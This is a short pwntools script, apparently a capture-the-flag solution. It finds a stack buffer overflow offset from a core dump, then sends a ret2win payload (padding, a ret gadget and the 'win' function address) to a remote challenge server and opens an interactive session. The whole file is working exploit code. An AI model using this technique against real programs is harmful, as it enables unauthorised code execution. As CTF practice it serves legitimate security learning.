from pwn import *

context.log_level = 'debug'

elf = ELF("./main")
io = elf.process()

io.clean()
io.sendline(cyclic(500, n=8))
io.wait()
core = io.corefile
offset = cyclic_find(core.read(core.rsp, 8), n=8)
log.success(f"{offset = }")

io = elf.process()
io = remote("01.linux.challenges.ctf.thefewchosen.com", 49161)
io.clean()
io.sendline(b"A" * offset + p64(next(elf.search(asm("ret"), executable=True))) + p64(elf.sym['win']))
io.clean()
io.interactive()
